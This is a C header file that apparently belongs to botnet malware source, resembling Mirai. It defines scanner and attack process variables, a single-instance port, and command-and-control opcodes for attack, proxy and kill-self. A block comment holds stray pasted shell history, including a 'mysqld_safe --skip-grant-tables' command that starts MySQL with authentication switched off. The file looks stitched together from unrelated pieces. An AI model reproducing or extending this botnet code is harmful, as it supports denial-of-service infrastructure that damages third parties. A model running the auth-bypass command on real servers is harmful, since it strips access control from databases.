#pragma once

#ifdef DEBUG
#include <stdarg.h>
#define DEBUG_PRINT(fmt, ...) printf("%s():%d:" fmt, __func__, __LINE__, ##__VA_ARGS__)
#else
#define DEBUG_PRINT(...)
#endif
/*

mysqld_safe --skip-grant-tables &
  33  mkdir -p /var/run/mysqld
  34  chown mysql:mysql /var/run/mysqld
  35  mysqld_safe --skip-grant-tables &


*/
#define PATH_MAX 4096

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define FALSE   0
#define TRUE    1
typedef char BOOL;

int pid1, pid2;
int scanner_pid;
int spid;
int maintain_thread, mainpid;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define SINGLE_INSTANCE_PORT 51101

#define CNC_OP_PING         0x00
#define CNC_OP_KILLSELF     0x10
#define CNC_OP_KILLATTKS    0x20
#define CNC_OP_PROXY        0x30
#define CNC_OP_ATTACK       0x40

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

ipv4_t LOCAL_ADDR;
